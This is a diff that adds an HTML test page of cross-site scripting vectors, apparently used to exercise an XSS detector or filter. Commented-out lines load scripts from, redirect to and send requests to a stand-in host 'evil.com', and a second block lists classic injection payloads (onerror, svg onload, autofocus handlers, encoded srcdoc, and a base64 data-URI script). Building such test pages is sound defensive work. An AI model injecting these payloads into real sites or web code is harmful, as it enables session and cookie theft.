@@ -1,0 +1,64 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>XSS Vector Test</title>
+    <link rel="stylesheet" href="https://code.jquery.com/jquery-3.3.1.min.js">
+</head>
+<body>
+    <script class="normal">
+        console.log('normal code');
+        var a = document.cookie;
+        
+        /*  insert DOM-based XSS vectors below  */
+        // //test data policies
+        // document.cookie = 'test123';
+
+        // //test elements
+        // var s = document.createElement('script');
+        // s.src="http://evil.com";
+        // document.body.appendChild(s);
+
+        // var s = document.createElement('img');
+        // s.src="javascript:alert(1)";
+        // document.body.appendChild(s);
+
+        // //test redirection
+        // location.href = "http://evil.com";
+        // open("http://evil.com");
+
+        // //test ajax
+        // xhr = new XMLHttpRequest();
+        // xhr.onreadystatechange = function() {
+        //     console.log(xhr.readyState);
+        //     if (xhr.readyState === 3 && xhr.status === 200) {
+        //             console.log(xhr.responseText);
+        //     }
+        // };
+        // xhr.open("get","http://evil.com",true);
+        // xhr.send();
+    </script>
+    <a href="http://www.baidu.com">baidu</a>
+    <div>
+        <iframe src="https://github.com"></iframe>
+        <img src="https://assets-cdn.github.com/images/modules/site/integrators/slackhq.png">
+    </div>
+
+    <!--  insert reflected XSS vectors below  -->
+    <!-- <IMG SRC=# onmouseover="alert('xxs')">
+    <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+    <script>alert(/XSS/)</script>
+    <img src=1 onerror="alert(/XSS/)">
+    <a href="http://evil.com"></a>
+    <div>
+        <svg/onload=alert(/XSS/)>
+        <input type="text" onmouseover="alert(/XSS/)">
+    </div>
+    <iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"></iframe>
+    <input onfocus=write(1) autofocus>
+    <input onblur=write(1) autofocus><input autofocus>
+    <video><source onerror="alert(1)"></video>
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object> -->
+</body>
+</html>
